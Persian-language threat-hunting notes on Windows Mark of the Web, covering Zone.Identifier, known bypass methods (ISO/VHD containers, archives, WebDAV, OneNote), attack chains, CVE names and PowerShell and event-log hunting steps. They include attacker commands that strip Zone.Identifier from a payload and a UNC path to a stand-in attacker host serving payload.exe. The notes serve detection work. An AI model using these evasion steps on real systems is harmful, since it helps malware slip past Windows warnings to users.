

##### initial access 

- تکنیک  25%
- خلاقیت 50%
- تجربه   25%

اینا پایه های initial access هستن 


# Mark of the Web (MotW)

## چیست؟

MotW یک مکانیزم امنیتی ویندوز است که به فایل‌هایی که از اینترنت دانلود می‌شن یک **metadata tag** اضافه می‌کنه تا سیستم بدونه این فایل از یک منبع خارجی و نامطمئن اومده.

---

## چطور پیاده‌سازی میشه؟

به شکل یک **Alternate Data Stream (ADS)** به نام `Zone.Identifier` روی فایل ذخیره میشه:

filename.exe:Zone.Identifier


محتوای این stream:

```ini
[ZoneTransfer]
ZoneId=3
ReferrerUrl=https://example.com/download
HostUrl=https://cdn.example.com/file.exe
```

### Zone IDs:

| ZoneId | معنی |
|--------|------|
| 0 | My Computer |
| 1 | Local Intranet |
| 2 | Trusted Sites |
| **3** | **Internet** ← مهم‌ترین |
| 4 | Restricted Sites |

---

## چرا برای Threat Hunting مهمه؟

### 1. SmartScreen و Protected View
وقتی ZoneId=3 باشه:
- Office فایل رو در **Protected View** باز می‌کنه → ماکرو اجرا نمیشه
- اجرای exe باعث popup هشدار SmartScreen میشه

### 2. Bypass تکنیک‌های مهاجمین
مهاجمین برای دور زدن MotW از این روش‌ها استفاده می‌کنن:

ISO / VHD / IMG  → فایل داخل container مستقیم mount میشه، MotW منتقل نمیشه
.LNK files       → shortcut‌ها MotW رو inherit نمی‌کنن (پچ شده)
Password-protected ZIP → فایل extract شده ممکنه MotW نداشته باشه
WebDAV           → بسته به config ممکنه MotW اعمال نشه


> **CVE-2022-41091** و **CVE-2023-36584** — bypass های معروف MotW در ویندوز

---

## آرتیفکت‌های Forensic

### بررسی وجود MotW:
```powershell
# بررسی یک فایل
Get-Item "C:\Users\user\Downloads\file.exe" -Stream *

# خواندن محتوا
Get-Content "C:\Users\user\Downloads\file.exe:Zone.Identifier"

# اسکن پوشه‌ای
Get-ChildItem -Path C:\Users\user\Downloads -Recurse | 
  ForEach-Object {
    $zone = Get-Content "$($_.FullName):Zone.Identifier" -EA SilentlyContinue
    if ($zone) { "$($_.Name) → $zone" }
  }
```

### فایل‌های بدون MotW که باید داشتن:
این یک **red flag** مهمه — اگه فایلی از اینترنت اومده ولی Zone.Identifier نداره، احتمالاً:
- از طریق ISO/VHD آمده
- MotW عمداً حذف شده
- از طریق یک روش غیرمعمول کپی شده

---

## در Threat Hunting چی دنبالش بگردیم؟

1. فایل‌های اجرایی در Downloads بدون MotW
2. فایل‌های ISO/IMG که mount شدن (Event ID 4663)
3. فایل‌های Office که از Protected View خارج شدن
4. Zone.Identifier با ZoneId غیرعادی (مثلاً 0 روی فایل دانلودی)


---

# MotW Bypass Techniques

## 1. Container File Formats

مهم‌ترین و رایج‌ترین روش. فایل اصلی داخل یه container قرار میگیره.

### ISO / IMG / VHD / VHDX
چرا کار میکنه:
- ویندوز ISO رو mount میکنه → فایل‌های داخل روی یه drive مجازی ظاهر میشن
- فایل‌های داخل ISO از filesystem مجازی خونده میشن
- ADS (که MotW ازش استفاده میکنه) روی CDFS/UDF ساپورت نمیشه
- نتیجه: هیچ Zone.Identifier روی فایل‌های داخل ISO اعمال نمیشه


**جریان حمله:**
User دانلود میکنه → setup.iso → mount میشه → setup.exe اجرا میشه
                                              ↑
                              بدون هیچ SmartScreen warning


---

### ZIP / RAR / 7z

| نوع آرشیو | رفتار MotW |
|-----------|------------|
| ZIP (بدون پسورد) | MotW منتقل **میشه** (ویندوز 11 پچ شد) |
| ZIP (با پسورد) | MotW منتقل **نمیشه** ← bypass |
| RAR | MotW منتقل **نمیشه** |
| 7z | MotW منتقل **نمیشه** |

دلیل فنی:
- Windows Explorer برای ZIP نیتیو MotW propagate میکنه
- ولی third-party extractorها (WinRAR, 7zip) این کار رو نمیکنن
- ZIP پسورددار → Windows Explorer نمیتونه محتوا رو ببینه → MotW اعمال نمیشه


---

## 2. Delivery از طریق پروتکل‌های غیر HTTP

### WebDAV
مهاجم یه WebDAV server راه میندازه
فایل از طریق UNC path اجرا میشه:
\\attacker.com\share\payload.exe

نتیجه: MotW اعمال نمیشه یا ZoneId=1 (Intranet) میشه


### SMB / Network Share
\\internal-share\payload.exe
ZoneId=1 میشه → SmartScreen فعال نمیشه


---

## 3. فرمت‌های خاص فایل

### .LNK (Shortcut)
قدیماً: LNK فایل MotW رو inherit نمیکرد
الان: پچ شده در MS22-Oct
ولی هنوز در ترکیب با ISO استفاده میشه


### OneNote (.one)
یکی از محبوب‌ترین روش‌های 2023
فایل‌های embed شده داخل OneNote:
- MotW ندارن
- مستقیم اجرا میشن با یه warning ساده
→ کمپین‌های Qakbot, IcedID از این استفاده کردن


### .MSI / .MSIX
Installer packageها رفتار متفاوتی دارن
گاهی MotW propagate نمیشه به فایل‌های extract شده


---

## 4. حذف مستقیم MotW

```powershell
# مهاجم بعد از دانلود، ADS رو حذف میکنه
Remove-Item "payload.exe:Zone.Identifier" -EA SilentlyContinue

# یا با cmd
more < payload.exe > clean_payload.exe
# کپی از طریق cmd → ADS از بین میره
```

---

## 5. Exploit های مستقیم

| CVE | توضیح |
|-----|-------|
| CVE-2022-41091 | Bypass در Mark of the Web ویندوز |
| CVE-2022-41049 | ZIP file MotW bypass |
| CVE-2023-36584 | MotW Security Feature Bypass |

---

## جمع‌بندی — Attack Chain رایج

Phishing Email
      ↓
ISO file attachment
      ↓
Mount میشه (double click)
      ↓
LNK یا EXE داخل ISO
      ↓
اجرا بدون MotW → بدون SmartScreen
      ↓
Payload (Cobalt Strike / RAT)


---

## شاخص‌های Hunt

```powershell
# فایل‌های اجرایی بدون MotW در Downloads
Get-ChildItem "$env:USERPROFILE\Downloads" -Recurse -Include *.exe,*.dll,*.ps1 |
  Where-Object {
    -not (Get-Item $_.FullName -Stream * | Where-Object Stream -eq "Zone.Identifier")
  }

# ISO mount شده → Event ID 4663 + Source: Virtual Disk
# OneNote → بررسی فایل‌های .one با attachment
```

---


### Hunting 

برای hunt ما حواسمون باید به سرور هایی که در درسترش عموم هستن باشه 
مثلا حواسمون باید به فایل هایی که از outlook یا microsoft 365 و...... دانلود میشه باشه 
در مرحله بعد فایل دانلود شده 
یعنی یه CONTRINER  فایل داریم که میتونه حالا جزوه موارد بالا باشه 
پس ما اینجا یه file create داریم 

- EventID 11 ----> file create
بعد از اون EventID باید تو همون بازه زمانی دنبال سایر EventID باشیم مثلا 

- EventID 1
- EventID 10
- EventID 7
- EventID 8
- other ......
- EventID 4698,4699,4702
- EventID 12,13

هر چیزی میتونه باشه، ممکنه فقط یه لاگ ازش ببینیم یا ممکنه بعد از اینکه فایل ها از اون contriner خونده شدن مجموعه یی از لاگ هارو ببینیم پس باید دقت داشته باشیم تو اون بازه زمانی .
دقت داشته باشین که ممکنه اصلا تو اون لحظه فعالیتی نبینیم اما باید دقت داشته باشیم به بعضی از مسیر ها  تو ریجستری که تو RunKey ها استفاده میشه یا 
شاید اصلا schedule task ساخته باشه 
پس چیزی که برای مهاجم مهمه persis هستش بعد از initial access و ما باید رو این قضیه حساس باشیم

**DEMO** -----> [[Malisious ISO]]
در لاگ های EventViewer در این مسیر 

```perl
EventViewer
	---> Application And Services Log
		----> Microsoft
			----> windows
				-----> VHDMP
```

###### در این مسیر باید به دنبال **EventID 12**  باشیم 

###### LOG

```
Handle for virtual disk 'C:\Users\Fani-02\AppData\Local\temp\82586287-A5B6-41AD-857C-4B41589D4AAE\swap.vhdx' created successfully. VM ID = {82586287-a5b6-41ad-857c-4b41589d4aae}, Type = VHDX, Version = 2, Flags = 0x80000E00, AccessMask = 0x0, WriteDepth = 1, GetInfoOnly = false, ReadOnly = false, HandleContext = 0x0, VirtualDisk = 0x0.
```

